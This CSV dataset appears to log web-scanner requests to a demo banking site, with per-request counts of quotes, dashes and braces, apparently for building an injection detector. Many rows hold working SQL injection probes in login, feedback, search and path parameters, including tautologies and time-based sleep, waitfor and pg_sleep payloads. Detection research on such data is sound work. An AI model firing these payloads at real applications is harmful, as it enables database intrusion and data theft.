method,path,body,single_q,double_q,dashes,braces,spaces,badWords,type
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0
GET,/%5c.htm,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=PMaSTN3k&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=VbPIouSr,,0,0,0,0,0,0,0
GET,/swagger/pSWR3Wn8.html,,0,0,0,0,0,0,0
GET,/swagger/%5c.html,,0,0,0,0,0,0,0
GET,/search.jsp?query=PgGDnRpY,,0,0,0,0,0,0,0
GET,/search.jsp?query=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=%40%40KFiUS,,0,0,0,0,0,0,0
GET,/1%00%c0%a7%c0%a2.htm,,0,0,0,0,0,0,0
GET,/swagger/1%00%c0%a7%c0%a2.html,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b879-879-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0
GET,/search.jsp?query=%40%40bYCtV,,0,0,0,0,0,0,0
GET,/swagger/index'%20AND%202*3*8%3d6*8%20AND%20'WKEq'%3d'WKEq.html,,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b412-412-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,0,4,0,0
GET,/search.jsp?query=1*1*1*1,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=%40%40ZUofz&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=JyI%3d,,0,0,0,0,0,0,0
GET,/%40%40kCb2k.htm,,0,0,0,0,0,0,0
GET,/swagger/%40%40atzKy.html,,0,0,0,0,0,0,0
GET,/search.jsp?query=JyI%3d,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b672-672-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b497-497-1%3d0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,2,0,0
GET,/swagger/index%22%20AND%202*3*8%3d6*8%20AND%20%22Bxqi%22%3d%22Bxqi.html,,0,4,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=JyI%3d&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=%bf'%bf%22,,1,1,0,0,0,0,0
GET,/JyI%3d.htm,,0,0,0,0,0,0,0
GET,/swagger/JyI%3d.html,,0,0,0,0,0,0,0
GET,/search.jsp?query=%bf'%bf%22,,1,1,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b19-19-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b537-537-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,0,4,0,0
GET,/swagger/index%25'%20AND%202*3*8%3d6*8%20AND%20'6n6l'%21%3d'6n6l%25.html,,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=%bf'%bf%22&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=%f0''%f0%22%22,,2,2,0,0,0,0,0
GET,/%bf'%bf%22.htm,,1,1,0,0,0,0,0
GET,/swagger/%bf'%bf%22.html,,1,1,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b130-130-1%3d0%2b0%2b0%2b1%20or%20'SSXb214D'%3d',,4,0,0,0,4,0,0
GET,/search.jsp?query=%f0''%f0%22%22,,2,2,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b908-908-1%3d0%2b0%2b0%2b1%20or%20'FvMQkgar'%3d'&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=%f0''%f0%22%22&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,2,2,0,0,0,0,0
GET,/swagger/if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/.html,,2,2,0,14,0,3,0
GET,/util/serverStatusCheckService.jsp?HostName=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0
GET,/%f0''%f0%22%22.htm,,2,2,0,0,0,0,0
GET,/swagger/%f0''%f0%22%22.html,,2,2,0,0,0,0,0
GET,/search.jsp?query=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0
GET,/util/serverStatusCheckService.jsp?HostName=-1%22%20OR%202%2b520-520-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=-1%22%20OR%202%2b29-29-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,1,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=(select%20convert(int%2cCHAR(65)))&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,3,1,1,0
GET,/(select%20convert(int%2cCHAR(65))).htm,,0,0,0,3,1,1,0
GET,/,,0,0,0,0,0,0,0
GET,/search.jsp?query=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,0
GET,/swagger/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/.html,,2,2,0,15,0,9,0
GET,/util/serverStatusCheckService.jsp?HostName=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,3,0
GET,/swagger/(select%20convert(int%2cCHAR(65))).html,,0,0,0,3,1,1,0
POST,/sendFeedback,submit=Submit&cfile=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,14,0,3,0
GET,/,,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,0
GET,/swagger/1%20waitfor%20delay%20'0:0:9'%20--%20.html,,2,0,1,0,5,2,0
GET,/search.jsp?query=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,0
GET,/util/serverStatusCheckService.jsp?HostName=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,9,0
POST,/sendFeedback,submit=Submit&cfile=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,15,0,9,0
GET,/,,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=1'%22,,1,1,0,0,0,0,0
GET,/dXXgWHVK.htm,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1'%22&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,0,0
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,0
GET,/swagger/U2i0z35K';%20waitfor%20delay%20'0:0:9'%20--%20.html,,3,0,1,0,5,2,0
GET,/,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,0,1,0,5,2,0
GET,/,,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,0
GET,/high_yield_investments'%20AND%202*3*8%3d6*8%20AND%20'Wa1x'%3d'Wa1x.htm,,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,0
GET,/swagger/lQ4a6LNd';select%20pg_sleep(3);%20--%20.html,,1,0,1,1,3,2,0
GET,/survey_questions.jsp?step=IvBDCEJ9,,0,0,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=nwJMs6bA';%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,3,0,1,0,5,2,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=3Io0rui5';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,0
GET,/survey_questions.jsp?step=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0
GET,/high_yield_investments%22%20AND%202*3*8%3d6*8%20AND%20%22kHr8%22%3d%22kHr8.htm,,0,4,0,0,4,0,0
GET,/search.jsp?query=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/swagger/4sMfm5MV');select%20pg_sleep(6);%20--%20.html,,1,0,1,1,3,2,0
GET,/survey_questions.jsp?step=b'%20AND%202*3*8%3d6*8%20AND%20'602V'%3d'602V,,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=bzJO3ZtR';select%20pg_sleep(6);%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=qtMJpgoR';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
GET,/survey_questions.jsp?step=%40%40nvJmc,,0,0,0,0,0,0,0
GET,/high_yield_investments%25'%20AND%202*3*8%3d6*8%20AND%20'7i2X'%21%3d'7i2X%25.htm,,4,0,0,0,4,0,0
GET,/swagger/lvsmEqqp'));select%20pg_sleep(6);%20--%20.html,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%40%40CYMvb&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/search.jsp?query=jOEsEKZ1';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,0
GET,/survey_questions.jsp?step=b%22%20AND%202*3*8%3d6*8%20AND%20%22k6ur%22%3d%22k6ur,,0,4,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=AoSQ7YsA');select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=JyI%3d,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=cfM5tnog');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
GET,/if(now()%3dsysdate()%2csleep(13)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(13)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(13)%2c0))OR%22*/.htm,,2,2,0,14,0,3,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=JyI%3d&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,0
GET,/search.jsp?query=-1;select%20pg_sleep(9);%20--%20,,0,0,1,1,3,2,0
GET,/survey_questions.jsp?step=b%25'%20AND%202*3*8%3d6*8%20AND%20'Hkgc'%21%3d'Hkgc%25,,4,0,0,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=ENlSlFO8'));select%20pg_sleep(9);%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,1,3,2,0
GET,/survey_questions.jsp?step=%bf'%bf%22,,1,1,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/,,0,0,0,0,0,0,0
GET,/util/serverStatusCheckService.jsp?HostName=5iq6yyjD'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
GET,/(select(0)from(select(sleep(4)))v)/*'%2b(select(0)from(select(sleep(4)))v)%2b'%22%2b(select(0)from(select(sleep(4)))v)%2b%22*/.htm,,2,2,0,15,0,9,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%bf'%bf%22&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,0,0
GET,/search.jsp?query=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,0
GET,/survey_questions.jsp?step=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/,,2,2,0,14,0,3,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=1'%22&uid=1,1,1,0,0,0,1,0
GET,/,,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=%f0''%f0%22%22,,2,2,0,0,0,0,0
GET,/1%20waitfor%20delay%20'0:0:4'%20--%20.htm,,2,0,1,0,5,2,0
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b264-264-1%3d0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%f0''%f0%22%22&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,2,2,0,0,0,0,0
GET,/search.jsp?query=-1));select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,0
GET,/survey_questions.jsp?step=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,,2,2,0,15,0,9,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=%5c&uid=1,0,0,0,0,0,1,0
GET,/,,0,0,0,0,0,2,0
GET,/survey_questions.jsp?step=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,1,0
GET,/oL6DznwN';%20waitfor%20delay%20'0:0:9'%20--%20.htm,,3,0,1,0,5,2,0
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b983-983-1%3d0%2b0%2b0%2b1&uid=1,0,0,0,0,2,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=(select%20convert(int%2cCHAR(65)))&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,3,1,1,0
GET,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:6'%20--%20,,2,0,1,0,5,2,0
GET,/search.jsp?query=BaIRrGD9';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2&uid=1,0,0,0,0,0,1,0
GET,/,,0,0,0,0,0,0,0
GET,/DdHkULdH';select%20pg_sleep(9);%20--%20.htm,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=IJgsd0wA&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,0,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b38-38-1%3d0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
GET,/survey_questions.jsp?step=1cv2kHsK';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,0
GET,/search.jsp?query=64bcXM10');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,0
POST,/doLogin,btnSubmit=Login&passw=%40%40mrYl5&uid=1,0,0,0,0,0,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b184-184-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,0,4,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b528-528-1%3d0%2b0%2b0%2b1%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,4,1,0
GET,/,,0,0,0,0,0,0,0
GET,/ueF3H8FP');select%20pg_sleep(13);%20--%20.htm,,1,0,1,1,3,2,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1'%22&name=tquhvjrr&subject=1,1,1,0,0,0,0,0
GET,/search.jsp?query=UI2OR88o'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
GET,/survey_questions.jsp?step=PHwWCuqw';select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
GET,/,,0,0,0,0,0,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b499-499-1%3d0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b528-528-1%3d0%2b0%2b0%2b1%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,0,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1%20OR%202%2b554-554-1%3d0%2b0%2b0%2b1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,2,0,0
GET,/ejnqopoW'));select%20pg_sleep(13);%20--%20.htm,,1,0,1,1,3,2,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1'%22,1,1,0,0,0,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=%5c&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b885-885-1%3d0%2b0%2b0%2b1,0,0,0,0,2,0,0
GET,/,,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b528-528)%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,1,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b260-260-1%3d0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,0,4,0,0
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,0
POST,/doLogin,btnSubmit=Login&passw=JyI%3d&uid=1,0,0,0,0,0,1,0
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b528-528)%20or%20'QrEyoGkc'%3d'&uid=1,4,0,0,1,4,1,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2&name=tquhvjrr&subject=1,0,0,0,0,0,0,0
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b853-853-1%3d0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,0
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b563-563-1%3d0%2b0%2b0%2b1%20or%20'4NaG8PQ8'%3d'&email_addr=sample%40email.tst&name=dudxbugh&subject=1,4,0,0,0,4,0,0
GET,/,,0,0,0,0,0,6,0
GET,/survey_questions.jsp?step=B1ts5zKl');select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,0
